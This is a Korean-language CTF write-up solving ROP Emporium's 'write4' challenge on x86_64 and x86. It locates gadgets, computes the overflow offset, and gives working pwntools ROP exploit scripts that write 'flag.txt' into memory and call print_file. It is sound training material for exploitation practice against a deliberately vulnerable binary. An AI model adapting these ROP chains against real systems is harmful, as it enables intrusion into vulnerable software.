# [write4](https://ropemporium.com/challenge/write4.html)
<br />

**Discription:**
> Our first foray into proper gadget use.
A useful function is still present, but we'll need to write a string into memory somehow.
<br />
<br />

# x86_64

**Binary Protections:**
```yaml
[*] '/home/kali/pico/write4'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'.'
    Stripped:   No
```
<br />
<br />

해당 문제는 가젯을 적절히 사용하여 `print_file("flag.txt")`를 호출하면 풀리는 문제입니다. 아래 과정을 통해 풀이를 진행하겠습니다.

```yaml
objdump -d write4

write4:     file format elf64-x86-64
...
Disassembly of section .text:
...
0000000000400617 <usefulFunction>:
  400617:       55                      push   %rbp
  400618:       48 89 e5                mov    %rsp,%rbp
  40061b:       bf b4 06 40 00          mov    $0x4006b4,%edi
  400620:       e8 eb fe ff ff          call   400510 <print_file@plt>
  400625:       90                      nop
  400626:       5d                      pop    %rbp
  400627:       c3                      ret

0000000000400628 <usefulGadgets>:
  400628:       4d 89 3e                mov    %r15,(%r14)
  40062b:       c3                      ret
  40062c:       0f 1f 40 00             nopl   0x0(%rax)
```
우선 `objdump -d` 명령어로 풀이에 필요한 정보를 찾을 수 있습니다. `usefulGadgets`가 핵심 가젯입니다.

> [!NOTE]
> `usefulGadgets` = `mov [r14], r15; ret`
>
> `r14`가 가리키는 메모리 주소에 `r15` 레지스터 값을 저장합니다.

<br />

```yaml
pwndbg> elf
...
0x600df8 - 0x600e00  .fini_array
0x600e00 - 0x600ff0  .dynamic
0x600ff0 - 0x601000  .got
0x601000 - 0x601028  .got.plt
0x601028 - 0x601038  .data
0x601038 - 0x601040  .bss

pwndbg> vmmap 0x601038
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
          0x600000           0x601000 r--p     1000      0 /home/kali/pico/write4
►         0x601000           0x602000 rw-p     1000   1000 /home/kali/pico/write4 +0x38
    0x7ffff7a0a000     0x7ffff7a32000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6
```
`print_file`의 인자로 넣으려면 쓰기 권한이 있는 영역에 `"flag.txt"`를 쓰고, `"flag.txt"`를 저장하고 있는 주소를 `rdi`에 넣어 사용해야 합니다. `elf` 명령어로 `bss(0x601038)`는 8바이트만큼 할당이 되어 있고, 쓰기 권한이 있는 것을 알 수 있습니다. 해당 영역에 `"flag.txt"`를 저장할 것입니다.

```yaml
$ ROPgadget --binary write4 | grep "rdi"
0x0000000000400693 : pop rdi ; ret

$ ROPgadget --binary write4 | grep "pop r14"
...
0x0000000000400690 : pop r14 ; pop r15 ; ret
...
```
위에서 설명한 `rdi`와 `r14`, `r15`에 대한 가젯을 찾아줍니다.

<br />

```yaml
$ python3 -q
>>> from pwn import *
>>>
>>> p = process("./write4")
[+] Starting local process './write4': pid 1891
>>> p.sendline(cyclic(400, n=8))
>>> p.wait()
[*] Process './write4' stopped with exit code -11 (SIGSEGV) (pid 1891)
>>> Corefile("./core.1891")
[+] Parsing corefile...: Done
[*] '/home/kali/pico/core.1891'
    Arch:      amd64-64-little
    RIP:       0x7f59cac00942
    RSP:       0x7ffcbc52af78
    Exe:       '/home/kali/pico/write4' (0x400000)
    Fault:     0x6161616161616166
Corefile('/home/kali/pico/core.1891')
>>> cyclic_find(0x6161616161616166, n=8)
40
```
마지막으로 위 과정을 통해 오프셋을 계산합니다. 오프셋은 40 입니다. 위에서 찾은 정보를 가지고 공격 코드를 작성할 수 있습니다.

<br />

```python
from pwn import *

context.log_level = "error"
context.arch = "amd64"

p = process("./write4")

print_file = 0x400510   # print_file_plt
pop_r14_r15 = 0x400690
mov_r14_r15 = 0x400628
pop_rdi = 0x400693
bss = 0x601038
flag = b"flag.txt"

pay = flat(
	{40:pop_r14_r15}, bss, flag,  # r14 = bss area, r15 = flag.txt
	mov_r14_r15,    # bss = 0x601038 = "flag.txt"
	pop_rdi, bss,
	print_file      # call print_file("flag.txt")
)

p.sendline(pay)
p.interactive()
```
```bash
$ python3 test.py
write4 by ROP Emporium
x86_64

Go ahead and give me the input already!

> Thank you!
ROPE{a_placeholder_32byte_flag!}
$
```

<br />
<br />

# x86

**Binary Protections:**
```yaml
[*] '/home/kali/pico/write432'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    RUNPATH:    b'.'
    Stripped:   No
```

<br />
<br />

```yaml
$ objdump -d write432
...
0804852a <usefulFunction>:
 804852a:       55                      push   %ebp
 804852b:       89 e5                   mov    %esp,%ebp
 804852d:       83 ec 08                sub    $0x8,%esp
 8048530:       83 ec 0c                sub    $0xc,%esp
 8048533:       68 d0 85 04 08          push   $0x80485d0
 8048538:       e8 93 fe ff ff          call   80483d0 <print_file@plt>
 804853d:       83 c4 10                add    $0x10,%esp
 8048540:       90                      nop
 8048541:       c9                      leave
 8048542:       c3                      ret

08048543 <usefulGadgets>:
 8048543:       89 2f                   mov    %ebp,(%edi)
 8048545:       c3                      ret
 8048546:       66 90                   xchg   %ax,%ax
 8048548:       66 90                   xchg   %ax,%ax
 804854a:       66 90                   xchg   %ax,%ax
 804854c:       66 90                   xchg   %ax,%ax
 804854e:       66 90                   xchg   %ax,%ax
...
```
`objdump -d` 명령어로 `print_file@plt`의 주소인 `0x80483d0`와 유용한 가젯을 찾을 수 있습니다.

> [!NOTE]
> `usefulGadgets` = `mov [edi], ebp`
> 위 가젯은 `edi`가 가리키는 메모리 주소에 `ebp` 레지스터 값을 저장합니다.

<br />

```yaml
$ ROPgadget --binary write432 | grep "pop"
...
0x080485aa : pop edi ; pop ebp ; ret
...
```
위에서 구한 가젯을 사용하려면 `edi`, `ebp`에 값을 넣어줘야 합니다. 해당 명령어로 사용할 가젯을 찾습니다. 

```yaml
pwndbg> elf
...
0x8049ffc - 0x804a000  .got
0x804a000 - 0x804a018  .got.plt
0x804a018 - 0x804a020  .data
0x804a020 - 0x804a024  .bss

pwndbg> vmmap 0x804a018
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
     Start        End Perm     Size Offset File
 0x8049000  0x804a000 r--p     1000      0 /home/kali/pico/write432
►0x804a000  0x804b000 rw-p     1000   1000 /home/kali/pico/write432 +0x18
0xf7d78000 0xf7d9b000 r--p    23000      0 /usr/lib/i386-linux-gnu/libc.so.6
```
`edi`에 넣을 쓰기 권한이 있는 영역을 탐색합니다. `data`와 `bss` 영역을 사용할 수 있지만, 8바이트 크기가 할당된 `data`영역을 사용하겠습니다. 이제 위에서 얻은 정보를 가지고 공격 코드를 작성할 수 있습니다.

<br />

```python
from pwn import *

context.log_level = "error"
context.arch = "x86"

p = process("./write432")

# gadgets
pop_edi_ebp = 0x80485aa
mov_edi_ebp = 0x8048543
pop_ret = 0x08048386

data_area = 0x804a018
print_file = 0x080483d0
flag = [b"flag", b".txt"]

pay = flat(
	b"A"*44,

	pop_edi_ebp, data_area, flag[0],   # edi = [data], ebp = "flag"
	mov_edi_ebp,					   # [data] = "flag"

	pop_edi_ebp, data_area+4, flag[1], # edi = [data+4], ebp = ".txt"
	mov_edi_ebp,					   # [data+4] = ".txt"

	print_file, pop_ret, data_area     # print_file("flag.txt")
)

p.sendline(pay)
p.interactive()
```
```bash
$ python3 test.py
write4 by ROP Emporium
x86

Go ahead and give me the input already!

> Thank you!
ROPE{a_placeholder_32byte_flag!}
$
```

